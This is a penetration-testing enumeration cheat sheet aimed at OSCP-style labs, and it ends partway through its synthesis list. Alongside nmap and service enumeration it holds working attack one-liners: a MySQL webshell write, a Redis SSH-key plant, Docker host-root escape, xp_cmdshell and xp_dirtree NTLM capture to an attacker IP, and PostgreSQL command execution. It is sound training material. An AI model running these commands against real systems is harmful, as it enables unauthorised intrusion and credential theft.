# Enumeration

> **Golden rule:** Enumeration is the most important phase of the OSCP. If you're stuck, you haven't enumerated enough. Every rabbit hole costs time — but missed service banners, unlisted vhosts, or default creds cost you the box.

---

## Table of Contents

1. [Playbook — Order of Operations](#playbook--order-of-operations)
2. [Setup & Variables](#setup--variables)
3. [Host Discovery](#host-discovery)
4. [Nmap — Port Scanning Workflow](#nmap--port-scanning-workflow)
5. [Synthesizing Nmap Output](#synthesizing-nmap-output)
6. [Common Ports Reference Table](#common-ports-reference-table)
7. [Service-by-Service Enumeration](#service-by-service-enumeration)
   - [21 / FTP](#21--ftp)
   - [22 / SSH](#22--ssh)
   - [23 / Telnet](#23--telnet)
   - [25, 465, 587 / SMTP](#25-465-587--smtp)
   - [53 / DNS](#53--dns)
   - [69 / TFTP](#69--tftp)
   - [79 / Finger](#79--finger)
   - [80, 443, 8080, 8443 / HTTP(S)](#80-443-8080-8443--https)
   - [88 / Kerberos](#88--kerberos)
   - [110, 995 / POP3](#110-995--pop3)
   - [111, 2049 / RPCbind & NFS](#111-2049--rpcbind--nfs)
   - [135, 139, 445 / SMB & RPC](#135-139-445--smb--rpc)
   - [143, 993 / IMAP](#143-993--imap)
   - [161, 162 / SNMP](#161-162--snmp)
   - [389, 636, 3268 / LDAP](#389-636-3268--ldap)
   - [443 / HTTPS Specific](#443--https-specific)
   - [512, 513, 514 / R-Services](#512-513-514--r-services)
   - [873 / Rsync](#873--rsync)
   - [1099 / Java RMI](#1099--java-rmi)
   - [1433 / MSSQL](#1433--mssql)
   - [1521 / Oracle TNS](#1521--oracle-tns)
   - [2049 / NFS](#2049--nfs-detail)
   - [2375 / Docker](#2375--docker)
   - [3306 / MySQL](#3306--mysql)
   - [3389 / RDP](#3389--rdp)
   - [5432 / PostgreSQL](#5432--postgresql)
   - [5601, 9200 / Elastic/Kibana](#5601-9200--elastickibana)
   - [5900 / VNC](#5900--vnc)
   - [5985, 5986 / WinRM](#5985-5986--winrm)
   - [6379 / Redis](#6379--redis)
   - [8000-9999 / Misc Web/Apps](#8000-9999--misc-webapps)
   - [11211 / Memcached](#11211--memcached)
   - [27017 / MongoDB](#27017--mongodb)
8. [Active Directory Quick-Look](#active-directory-quick-look)
9. [What to Pivot On (Synthesis)](#what-to-pivot-on-synthesis)
10. [Note-Taking Template](#note-taking-template)

---

## Playbook — Order of Operations

Run this in order on every box. Don't skip steps when "you already know what it is."

```
1.  Set IP and target name as shell variables (saves typing, fewer mistakes)
2.  Ping sweep / verify host is up
3.  Fast full TCP port scan        (all 65535 ports, -p-)
4.  Targeted version + script scan on the open ports found (-sC -sV -p <list>)
5.  UDP scan top 100 ports         (run in background while you work)
6.  Add any hostnames discovered to /etc/hosts immediately
7.  Enumerate each open service in parallel — never serialize
8.  Re-scan after foothold (new internal interfaces, new ports)
```

**Parallel work mindset:** while the all-ports nmap runs (5–15 min), start brute-forcing web on 80 / 443 with `feroxbuster`, and SMB with `enum4linux-ng`. Don't watch nmap finish.

---

## Setup & Variables

Set these once per box. Every command below assumes `$IP` is set.

```bash
export IP=10.10.10.10
export NAME=box-name        # for output files
mkdir -p ~/boxes/$NAME/{nmap,web,smb,loot}
cd ~/boxes/$NAME
```

**Tmux layout for enumeration:**
```
pane 1: nmap full TCP scan
pane 2: nmap UDP scan
pane 3: web fuzzing (feroxbuster / ffuf)
pane 4: notes / synthesizing
```

---

## Host Discovery

When you've been given a subnet rather than a single IP:

```bash
# Fast ping sweep with nmap
nmap -sn 10.10.10.0/24 -oA nmap/sweep

# ARP-based (LAN only, more reliable)
sudo arp-scan -l
sudo netdiscover -r 10.10.10.0/24

# fping (very fast)
fping -aqg 10.10.10.0/24

# If ICMP blocked — TCP SYN ping on common ports
nmap -sn -PS22,80,443,445,3389 10.10.10.0/24
```

---

## Nmap — Port Scanning Workflow

### Phase 1 — Fast full TCP sweep (all 65535 ports, no scripts)

```bash
sudo nmap -p- --min-rate=1000 -T4 -Pn $IP -oA nmap/all-tcp
# Variations:
sudo nmap -p- --min-rate=5000 -T4 -Pn $IP            # faster, may miss filtered
sudo nmap -p- -sS -T4 -Pn $IP --open                 # only show open
sudo nmap -p- --max-retries=1 --min-rate=2000 $IP    # very fast, drops drop hosts
```

Flags worth knowing:
- `-p-` — all 65535 ports (default is top 1000 — too narrow)
- `-Pn` — skip host discovery; treat as up. Required for HTB/PG-style boxes that block ICMP.
- `-sS` — SYN scan (needs root; default if root)
- `--min-rate` — packets/sec floor; tune up for speed, down for accuracy on flaky networks
- `-T4` — timing template (T0=paranoid → T5=insane). T4 is the sweet spot.
- `-n` — no DNS resolution (faster)
- `--open` — only show open ports in output (less noise)
- `-oA <name>` — output all 3 formats (nmap, gnmap, xml). **Always do this.**

Extract just the open ports:
```bash
ports=$(grep -oP '\d+/open' nmap/all-tcp.nmap | cut -d/ -f1 | paste -sd, -)
echo $ports
```

### Phase 2 — Targeted service / version / script scan

```bash
sudo nmap -p$ports -sC -sV -Pn $IP -oA nmap/tcp-deep
# More thorough:
sudo nmap -p$ports -sC -sV -A -Pn $IP -oA nmap/tcp-deep
# Vuln check (slow, noisy):
sudo nmap -p$ports --script vuln -Pn $IP -oA nmap/tcp-vuln
```

- `-sC` — run default safe NSE scripts
- `-sV` — version detection (banner grab, probe)
- `-A` — `-sC -sV -O --traceroute` combined
- `--script=<name>` — run a specific NSE script (e.g. `smb-vuln-*`)
- `--script-args` — pass args (e.g. creds for smb-enum-shares)

### Phase 3 — UDP scan (run in background)

UDP is slow but missing it costs you SNMP, TFTP, DNS-on-UDP, IKE, etc.

```bash
sudo nmap -sU --top-ports=100 --min-rate=1000 -Pn $IP -oA nmap/udp-top100
# Targeted (faster) if you suspect SNMP/TFTP:
sudo nmap -sU -p 53,67,68,69,123,135,137,138,161,162,500,514,520,623,1900,4500,5353 $IP -oA nmap/udp-known
```

UDP results are noisy: `open|filtered` usually means closed/filtered; treat `open` as the signal.

### Phase 4 — Re-scan after foothold

Once on the box, scan its internal interfaces. Loopback services (127.0.0.1:8080 etc.) are extremely common privesc / lateral-movement vectors.

```bash
# from inside the box:
ss -tlnp ; ss -ulnp           # Linux
netstat -ano | findstr LISTEN # Windows
```

Then port-forward those loopback services back to your attacker box (see Tunneling.md).

---

## Synthesizing Nmap Output

After phase 2 completes, **read the entire output once, top to bottom**, before touching any service. You're looking for:

| Signal | What to do |
|---|---|
| `commonName=foo.htb` in TLS cert | Add `foo.htb` to `/etc/hosts` immediately |
| `http-title:` shows a redirect to a hostname | Add to `/etc/hosts`, retry with hostname |
| `smb-os-discovery:` `Domain: CORP.LOCAL` | AD domain — add DC FQDN and domain to hosts |
| `ldap` rootDSE shows naming context | Confirms AD domain name |
| Banner exposes exact version (e.g. `vsftpd 2.3.4`) | Searchsploit immediately |
| Non-standard port for known service (e.g. SSH on 2222) | Note it; treat normally but watch for it in scripts |
| `OS: Windows 7 / 2008 / XP` | Likely EternalBlue / classic SMB exploits in play |
| Anonymous FTP / SMB null session allowed | Pull *everything* before anything else |
| `robots.txt`, `.git/`, `.DS_Store` in http-enum | Mine these first — they leak |

### Add hostnames to /etc/hosts

The single most-missed step. If nmap (or any tool) shows a domain name, add it:

```bash
echo "$IP  box.htb www.box.htb admin.box.htb" | sudo tee -a /etc/hosts
```

Many boxes only respond properly when accessed by hostname (vhost routing). Re-run web enumeration against the hostname after adding it. Then **fuzz for vhosts** (see HTTP section).

---

## Common Ports Reference Table

| Port | Proto | Service | What to look for | Common attacks |
|---|---|---|---|---|
| 21 | TCP | FTP | Anonymous login, version | Anon access, `vsftpd 2.3.4` backdoor, `ProFTPD 1.3.5` mod_copy, creds reuse |
| 22 | TCP | SSH | Version, banner, auth methods | Weak creds, key reuse, old libssh CVE, username enum (OpenSSH < 7.7) |
| 23 | TCP | Telnet | Banner | Cleartext creds, default creds |
| 25 | TCP | SMTP | Banner, VRFY/EXPN, open relay | User enum (VRFY/EXPN/RCPT), open relay → phishing |
| 53 | TCP/UDP | DNS | Zone transfer, version.bind | AXFR, DNS recon for subdomains |
| 69 | UDP | TFTP | Readable files | Pull config files (router/IoT) |
| 79 | TCP | Finger | User list | User enumeration |
| 80 | TCP | HTTP | Title, server, vhost redirects, robots.txt | OWASP top 10, dir busting, vhost fuzz, CVEs in CMS |
| 88 | TCP | Kerberos | AD domain present | AS-REP roast, kerberoast, user enum |
| 110 | TCP | POP3 | Banner | Cleartext creds, weak auth |
| 111 | TCP | RPCbind | NFS exports, RPC programs | Mountable shares, rpc-info |
| 135 | TCP | MS RPC | DCOM endpoints | RPC endpoint mapper enum |
| 139 | TCP | NetBIOS | Hostname, domain | Null session SMB |
| 143 | TCP | IMAP | Banner | Cleartext creds |
| 161 | UDP | SNMP | Community string | Public/private string → full host info dump |
| 389 | TCP | LDAP | Domain, naming context | Anonymous bind → users/groups |
| 443 | TCP | HTTPS | TLS cert (SAN/CN!), title | Same as HTTP + extract hostnames from cert |
| 445 | TCP | SMB | Shares, version, signing | Null session, EternalBlue, SMBGhost, share access |
| 500 | UDP | IKE/IPsec | Aggressive mode | PSK capture |
| 512-514 | TCP | rexec/rlogin/rsh | Trust relationships | Passwordless login if `.rhosts` misconfigured |
| 587 | TCP | SMTP submission | Auth methods | Same as 25 |
| 623 | UDP | IPMI | Banner | Auth bypass (CVE-2013-4786), cipher 0 |
| 636 | TCP | LDAPS | Cert | Same as 389 |
| 873 | TCP | rsync | Modules list | Anonymous rsync modules → pull files |
| 1099 | TCP | Java RMI | Classes | Insecure deserialization (ysoserial) |
| 1433 | TCP | MSSQL | Version, instance | `sa` weak pwd, xp_cmdshell, linked servers |
| 1521 | TCP | Oracle TNS | SID | SID brute force, TNS poisoning |
| 2049 | TCP | NFS | Exports | Mount `/`, no_root_squash → root file write |
| 2375 | TCP | Docker API | Containers | Unauth Docker → host root via container |
| 3128 | TCP | Squid proxy | Open relay | Proxy abuse |
| 3268 | TCP | LDAP GC | AD forest info | Same as LDAP, forest-wide |
| 3306 | TCP | MySQL | Version, anon | Weak creds, UDF, file read |
| 3389 | TCP | RDP | NLA on/off, cert hostname | BlueKeep (2008/7), weak creds |
| 5432 | TCP | PostgreSQL | Version | Weak creds, `COPY PROGRAM` RCE |
| 5601 | TCP | Kibana | Version | CVE-2018-17246 LFI/RCE |
| 5900 | TCP | VNC | Auth type | No auth, weak password, view-only abuse |
| 5985 | TCP | WinRM HTTP | AD-joined? | Valid AD creds → shell (evil-winrm) |
| 5986 | TCP | WinRM HTTPS | Cert | Same as 5985 |
| 6379 | TCP | Redis | Auth required? | Unauth → SSH key write, webshell write |
| 8000-9000 | TCP | Misc web | Title | App-specific CVEs (Jenkins, Tomcat, GitLab) |
| 8009 | TCP | AJP | Tomcat | Ghostcat (CVE-2020-1938) |
| 8080 | TCP | HTTP-alt | Often Tomcat/Jenkins | Tomcat Manager default creds, Jenkins script console |
| 9200 | TCP | Elasticsearch | Indices | Unauth API, old CVEs (RCE) |
| 11211 | TCP | Memcached | Stats | UDP amplification, key dump |
| 27017 | TCP | MongoDB | Auth | Unauth access |

---

## Service-by-Service Enumeration

### 21 / FTP

**Why it matters:** Anonymous FTP is still common on lab boxes. Banner version often unlocks an immediate exploit.

```bash
# Banner / connect
nc -nv $IP 21
ftp $IP                                # try anonymous : anonymous
nmap -p21 -sV -sC --script=ftp-anon,ftp-syst,ftp-bounce $IP

# Once in:
ftp> binary
ftp> ls -la                            # also try -laR for recursive
ftp> mls *.* /tmp/ftplist              # list all to local file
ftp> mget *                            # grab all
ftp> prompt off                        # don't ask per-file

# Vsftpd 2.3.4 backdoor (smiley) — type user with `:)`, then any pwd → 6200 shell
# ProFTPD 1.3.5 mod_copy — SITE CPFR/CPTO arbitrary file read/write
```

**What to look for:**
- Anonymous login allowed → pull *all* files (even hidden).
- Writable directory → drop a webshell if FTP shares a web root.
- Exact version → `searchsploit vsftpd`, `searchsploit proftpd`.
- Cleartext creds in `.bash_history`, `config.php`, `web.config` in pulled files.

### 22 / SSH

```bash
nmap -p22 -sV -sC $IP
ssh -v $IP                              # see banner, auth methods offered
ssh-keyscan -p 22 $IP                   # capture host keys (fingerprint reuse)

# Username enum (OpenSSH < 7.7, CVE-2018-15473)
python3 sshUserEnum.py --port 22 --userList users.txt $IP

# Auth methods supported (publickey only? password?)
ssh -o PreferredAuthentications=none -o NoneEnabled=yes $IP
```

**What to look for:**
- Old OpenSSH (< 7.7) → username enum possible.
- libssh 0.8.x → CVE-2018-10933 auth bypass.
- Once you have a user (any other service), try password reuse here.
- Keys lying around in pulled FTP/SMB data — try them.

### 23 / Telnet

```bash
nc -nv $IP 23
telnet $IP 23
nmap -p23 -sV -sC --script=telnet-encryption,telnet-ntlm-info $IP
```

Cleartext — try default creds, banner often gives device model. Solaris in.telnetd CVE-2007-0882 (`-froot`) is a classic.

### 25, 465, 587 / SMTP

```bash
nc -nv $IP 25
nmap -p25 -sV -sC --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-* $IP

# User enumeration (3 methods — try all)
smtp-user-enum -M VRFY -U users.txt -t $IP
smtp-user-enum -M EXPN -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP -f attacker@x.com

# Manual VRFY:
HELO test
VRFY root
VRFY admin
```

**What to look for:** valid users → spray on SSH/web/OWA. Open relay → phishing on Active Directory pentests.

### 53 / DNS

```bash
# Version
dig version.bind chaos txt @$IP
nmap -p53 --script=dns-nsid $IP

# Zone transfer (huge win when it works)
dig axfr @$IP <domain>
dig axfr @$IP <domain>.htb
host -l <domain> $IP

# Reverse PTR sweep
for i in {1..254}; do host 10.10.10.$i $IP; done | grep -v NXDOMAIN

# Subdomain brute (if you have a candidate domain)
dnsenum --dnsserver $IP -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $IP
```

**What to look for:** AXFR success → subdomains, hostnames, internal IPs. Reverse sweeps on the internal range after foothold reveal AD layout.

### 69 / TFTP

```bash
tftp $IP
tftp> get <filename>
nmap -sU -p69 --script=tftp-enum $IP
```

Blind file pull — guess common names: `running-config`, `startup-config`, `system.cfg`, `/etc/passwd`.

### 79 / Finger

```bash
finger @$IP
finger root@$IP
for u in $(cat users.txt); do finger $u@$IP; done
```

### 80, 443, 8080, 8443 / HTTP(S)

This is the biggest section because web is the most common foothold.

#### Quick triage

```bash
# What is it?
curl -sIk http://$IP/                                 # response headers
curl -sk  http://$IP/ | head -50                      # body
whatweb -a3 http://$IP/
nmap -p80,443 -sV -sC --script="http-enum,http-title,http-headers,http-methods,http-robots.txt,http-server-header,http-shellshock" $IP

# Browser it. Look at the source, look at cookies, look at the favicon.
curl -sk http://$IP/favicon.ico | md5sum             # cross-ref favicon-database
```

#### Directory / file fuzzing

```bash
# feroxbuster (preferred — recursive, fast)
feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -o web/ferox.txt
feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,asp,aspx,jsp -t 50

# gobuster (alternative)
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html -t 50 -o web/gobuster.txt

# ffuf (most flexible)
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.html,.txt -mc 200,204,301,302,307,401,403
```

Common useful wordlists:
- `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`
- `/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`
- `/usr/share/seclists/Discovery/Web-Content/big.txt`
- `/usr/share/seclists/Discovery/Web-Content/CMS/<cms>.fuzz.txt`

#### Vhost fuzzing (ALWAYS DO THIS if you have a hostname)

```bash
ffuf -u http://$IP/ -H "Host: FUZZ.box.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <size-of-default-page>
gobuster vhost -u http://box.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```

`-fs <size>` filters out the default page response — set it to whatever size you see for nonexistent vhosts.

#### Parameter fuzzing

```bash
ffuf -u "http://$IP/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>
arjun -u http://$IP/page.php
```

#### CMS-specific

```bash
# WordPress
wpscan --url http://$IP/ -e ap,at,u --plugins-detection aggressive
# Drupal
droopescan scan drupal -u http://$IP/
# Joomla
joomscan -u http://$IP/
```

#### What to look for in HTTP output

| Signal | Meaning / Action |
|---|---|
| TLS cert CN/SAN shows `*.foo.htb` | Add `foo.htb` and likely subdomains to /etc/hosts |
| Page redirects to a hostname | Add to /etc/hosts, re-curl with `--resolve` or after host entry |
| `Server:` reveals exact version | Searchsploit it |
| `X-Powered-By: PHP/5.x` | Old PHP — look for known CVEs |
| `Set-Cookie: PHPSESSID` | PHP backend |
| `Set-Cookie: JSESSIONID` | Java backend → Tomcat/Jenkins likely |
| `Set-Cookie: ASP.NET_SessionId` | IIS/ASP.NET |
| `robots.txt` with `Disallow:` entries | Visit each — they hide things on purpose |
| `/.git/` accessible | `git-dumper` the repo → source code |
| `/.svn/`, `/.hg/`, `/.DS_Store` | Same idea |
| `/server-status`, `/server-info` | Apache mod_status leak |
| `/phpinfo.php` | Leaks env, paths, modules |
| `/admin`, `/login`, `/wp-admin` | Try default creds, then password spray |
| HTML comments with `<!-- TODO -->`, dev notes | Often leak creds or paths |
| Form action posts to unusual endpoint | Test SQLi / cmd inj there |
| Upload form | Test for unrestricted file upload → webshell |
| `?file=`, `?page=`, `?include=` | LFI/RFI candidates |
| `?id=`, `?user=`, `?cat=` | SQLi candidates |

#### When you find creds anywhere — try them everywhere

Cred reuse is the #1 lateral movement vector. SSH, SMB, RDP, WinRM, app login, MySQL root, MSSQL sa, FTP.

### 88 / Kerberos

Presence = Active Directory. See [Active Directory Quick-Look](#active-directory-quick-look).

```bash
nmap -p88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='CORP.LOCAL',userdb=users.txt" $IP

# Get realm from nmap output of port 88 — used elsewhere
# AS-REP roasting (no preauth users)
impacket-GetNPUsers CORP.LOCAL/ -usersfile users.txt -no-pass -dc-ip $IP
# Kerberoasting (with valid creds)
impacket-GetUserSPNs CORP.LOCAL/user:pass -dc-ip $IP -request
```

### 110, 995 / POP3

```bash
nc -nv $IP 110
> USER admin
> PASS password
> LIST
> RETR 1
```

### 111, 2049 / RPCbind & NFS

```bash
# List RPC programs
rpcinfo -p $IP
nmap -p111 --script=rpcinfo,nfs-ls,nfs-statfs,nfs-showmount $IP

# What's exported?
showmount -e $IP

# Mount it
mkdir /mnt/nfs
sudo mount -t nfs $IP:/export /mnt/nfs -o nolock
# If no_root_squash and rw → become root locally, chown a SUID binary there → privesc on target
```

### 135, 139, 445 / SMB & RPC

The single highest-yield service in OSCP / AD labs.

```bash
# Quick triage
nmap -p139,445 -sV -sC --script="smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln-*,smb2-security-mode,smb2-time" $IP

# Null session check (anonymous)
smbclient -L //$IP/ -N
smbclient -L //$IP/ -U ''
rpcclient -U "" -N $IP
crackmapexec smb $IP -u '' -p ''                       # CME / nxc
nxc smb $IP -u '' -p ''                                # netexec (CME successor)

# Enum4linux-ng — single best one-shot
enum4linux-ng -A $IP -oA smb/enum4linux

# Once you can list shares:
smbclient //$IP/share -N                               # null
smbclient //$IP/share -U user%pass
smbmap -H $IP -u user -p pass                          # shows R/W per share
smbmap -H $IP -u '' -p ''                              # null

# Recursive list and download
smbclient //$IP/share -N -c 'recurse;ls'
smbmap -H $IP -u user -p pass -R share -A '.*' -q      # download all matching

# Enum users / groups / RIDs via rpcclient
rpcclient -U "" -N $IP
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser <RID>
rpcclient $> querydispinfo
rpcclient $> getdompwinfo

# RID cycling (no creds)
nxc smb $IP -u guest -p '' --rid-brute 10000

# Vulns
nmap -p445 --script=smb-vuln-ms17-010 $IP              # EternalBlue
nmap -p445 --script=smb-vuln-cve-2020-0796 $IP         # SMBGhost
```

**What to look for in SMB output:**
- `signing: disabled` → relay attacks possible (`responder` + `ntlmrelayx`)
- `Domain: CORP` and `OS: Windows Server 2016` → AD DC
- Shares `SYSVOL`, `NETLOGON` → confirmed DC, pull GPP cpasswords from `Groups.xml`
- Shares like `Backup`, `IT`, `Users`, `Software` — always readable on lab boxes
- Print shares (`PRINTERS$`) — sometimes writable
- `IPC$` allowing null session → user enum via `enum4linux` works

### 143, 993 / IMAP

```bash
nc -nv $IP 143
> a LOGIN user pass
> a LIST "" "*"
> a SELECT INBOX
> a FETCH 1 BODY[]
nmap -p143 -sV -sC --script=imap-capabilities,imap-ntlm-info $IP
```

### 161, 162 / SNMP

A goldmine — full system info, processes, users, sometimes cleartext community-string-as-password reuse.

```bash
# Find community string (try common ones)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP

# With public:
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25      # Windows users
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2     # Processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2     # Installed software
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.27      # SNMP shares
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3       # Listening TCP ports

# snmpbulkwalk is faster
snmpbulkwalk -v2c -c public $IP

# snmp-check is human readable
snmp-check $IP -c public
```

**What to look for:** processes running as users (cred names), command lines including passwords (`mysql -u root -pP@ss`), startup scripts, installed software versions.

### 389, 636, 3268 / LDAP

```bash
# Anonymous bind — naming context
ldapsearch -x -H ldap://$IP -s base namingcontexts
# Output gives you e.g. DC=corp,DC=local

# Dump everything anonymously (if allowed)
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" '(objectClass=*)' > ldap/dump.txt

# Users only
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" '(objectClass=person)' sAMAccountName
# Look for description fields — often have passwords on labs:
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" '(objectClass=user)' sAMAccountName description

# windapsearch (cleaner)
windapsearch.py -d corp.local --dc-ip $IP -U
windapsearch.py -d corp.local --dc-ip $IP --da

# nmap scripts
nmap -p389 --script=ldap-rootdse,ldap-search $IP
```

### 443 / HTTPS Specific

```bash
# Cert is everything — names lead to vhosts
openssl s_client -connect $IP:443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'CN|DNS'
nmap -p443 --script=ssl-cert,ssl-enum-ciphers,http-* $IP
# sslscan / testssl.sh for full TLS audit
sslscan $IP
testssl.sh https://$IP
```

Every name in the cert SAN goes in `/etc/hosts`.

### 512, 513, 514 / R-Services

```bash
rlogin -l root $IP                                     # if .rhosts trusts you
rsh $IP id
# nmap default scripts cover rexec-brute, rlogin-brute, rsh-brute
```

### 873 / Rsync

```bash
rsync $IP::                                            # list modules (anon)
rsync rsync://$IP/                                     # alt syntax
rsync -av rsync://$IP/module/ ./loot/rsync/            # pull
rsync -av ./shell.php rsync://$IP/module/              # write?
```

### 1099 / Java RMI

```bash
nmap -p1099 --script=rmi-dumpregistry,rmi-vuln-classloader $IP
# RCE often via ysoserial gadget chains
java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin
```

### 1433 / MSSQL

```bash
nmap -p1433 -sV --script=ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-dump-hashes $IP
nxc mssql $IP -u sa -p '' --local-auth
nxc mssql $IP -u sa -p Password1                       # try common
impacket-mssqlclient -p 1433 sa:'Password1'@$IP
impacket-mssqlclient corp.local/user:pass@$IP -windows-auth

# Once in:
SQL> EXEC xp_cmdshell 'whoami'
SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
SQL> EXEC master..xp_dirtree '\\10.10.14.x\share'      # NTLM capture via responder

# Linked servers — classic privesc/lateral
SQL> EXEC sp_linkedservers
SQL> SELECT * FROM OPENQUERY("SRV01", 'SELECT @@version')
```

### 1521 / Oracle TNS

```bash
nmap -p1521 --script=oracle-sid-brute,oracle-brute,oracle-tns-version $IP
odat all -s $IP
```

### 2049 / NFS (detail)

```bash
showmount -e $IP
mkdir /mnt/nfs && sudo mount -t nfs $IP:/<export> /mnt/nfs -o nolock,vers=3
ls -la /mnt/nfs

# Misconfigs to look for:
# - no_root_squash: as root locally, you can chown files / create SUID binaries that execute as root on target
# - rw on a path containing authorized_keys or web root: drop your key / a webshell
```

### 2375 / Docker

```bash
curl http://$IP:2375/version
curl http://$IP:2375/containers/json
docker -H tcp://$IP:2375 ps
docker -H tcp://$IP:2375 run -v /:/host -it alpine chroot /host sh    # host root
```

### 3306 / MySQL

```bash
nmap -p3306 -sV --script=mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables $IP
mysql -h $IP -u root -p''                              # blank
mysql -h $IP -u root -pPassword1
# Once in:
SHOW DATABASES;
SELECT user,password FROM mysql.user;
SELECT @@version_compile_os, @@datadir, @@version;
SELECT LOAD_FILE('/etc/passwd');                        # file read if FILE priv
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';
```

### 3389 / RDP

```bash
nmap -p3389 -sV --script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info $IP
# rdp-ntlm-info leaks hostname + domain when NLA is on — write it down
# Connect (Linux):
xfreerdp /v:$IP /u:user /p:pass /dynamic-resolution /cert:ignore /drive:share,/tmp
rdesktop -u user -p pass $IP
# Spray (carefully — lockouts!)
nxc rdp $IP -u users.txt -p 'Password1' --continue-on-success
# BlueKeep on 2008R2 / 7 / XP only — careful in exam, often crashes
```

### 5432 / PostgreSQL

```bash
nmap -p5432 --script=pgsql-brute $IP
psql -h $IP -U postgres                                # try blank / postgres
# RCE on >= 9.3:
psql=> CREATE TABLE cmd(t text);
psql=> COPY cmd FROM PROGRAM 'id';
psql=> SELECT * FROM cmd;
```

### 5601, 9200 / Elastic/Kibana

```bash
curl http://$IP:9200/                                  # version
curl http://$IP:9200/_cat/indices?v
curl http://$IP:9200/<index>/_search?pretty
# Old versions: CVE-2014-3120, CVE-2015-1427 (Groovy sandbox bypass → RCE)
# Kibana < 6.6: CVE-2018-17246 LFI/RCE
```

### 5900 / VNC

```bash
nmap -p5900 --script=vnc-info,realvnc-auth-bypass,vnc-brute $IP
vncviewer $IP                                          # no auth?
vncviewer $IP -passwd pwd.bin                          # if you have the pw file
```

### 5985, 5986 / WinRM

Presence of 5985/5986 + valid AD creds = shell.

```bash
nxc winrm $IP -u user -p pass
nxc winrm $IP -u users.txt -p 'Password1' --continue-on-success
evil-winrm -i $IP -u user -p pass
evil-winrm -i $IP -u user -H <NTLM-hash>                # pass-the-hash
```

### 6379 / Redis

```bash
redis-cli -h $IP
> INFO
> CONFIG GET *
> KEYS *

# RCE classics (unauth Redis):
# 1) SSH key write
redis-cli -h $IP CONFIG SET dir /root/.ssh/
redis-cli -h $IP CONFIG SET dbfilename authorized_keys
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") | redis-cli -h $IP -x SET crackit
redis-cli -h $IP SAVE
# 2) Webshell write to web root
# 3) Module load (newer versions) → RCE
```

### 8000-9999 / Misc Web/Apps

Always treat as HTTP — same workflow as port 80. Hot candidates:

- **8080 Tomcat:** `/manager/html` → default creds `tomcat:s3cret`, `tomcat:tomcat`, `admin:admin` → upload WAR shell.
- **8080 Jenkins:** `/script` → Groovy console RCE if authenticated as admin. Anonymous read often leaks build artifacts and creds.
- **8009 AJP Tomcat:** Ghostcat (CVE-2020-1938) file read / RCE.
- **8443 various:** vCenter, Plesk, GitLab admin.
- **3000 Grafana / Gitea:** check version.
- **5000 Flask dev / UPnP:** weak.
- **7001 WebLogic:** Many serialization CVEs.
- **9090 Cockpit / Prometheus.**
- **9000 SonarQube / PHP-FPM (if exposed):** php-fpm RCE.

### 11211 / Memcached

```bash
nc -nv $IP 11211
stats
stats items
get <key>
```

### 27017 / MongoDB

```bash
nmap -p27017 --script=mongodb-info,mongodb-databases $IP
mongo $IP
mongo --host $IP --eval "db.adminCommand('listDatabases')"
```

---

## Active Directory Quick-Look

If you see ports **88 (Kerberos)**, **389/636 (LDAP)**, **445 (SMB)**, **5985 (WinRM)**, and **53 (DNS)** all open — you're against a Domain Controller. Treat it as such.

```bash
# Identify the domain three ways (cross-check)
nmap -p139,445 --script=smb-os-discovery $IP            # Domain, FQDN, OS
ldapsearch -x -H ldap://$IP -s base namingcontexts      # naming context
nxc smb $IP                                             # one-liner: hostname, domain, signing

# Get the realm string (e.g. CORP.LOCAL) and put in /etc/hosts:
echo "$IP  corp.local dc01.corp.local dc01" | sudo tee -a /etc/hosts

# No-creds enumeration
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip $IP
nxc smb $IP -u '' -p '' --users
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u guest -p '' --rid-brute 10000

# With creds — full enum
nxc smb $IP -u user -p pass --users --groups --shares --pass-pol
bloodhound-python -u user -p pass -d corp.local -ns $IP -c All --zip
```

See `Active-Directory.md` for the full AD attack tree.

---

## What to Pivot On (Synthesis)

After all initial enumeration, sit back and answer these questions before exploiting anything:

1. **Is there a username list?**  From SMB null session, finger, SMTP VRFY, web (author tags, "/about", git commits), default app users. Compile to `users.txt`.
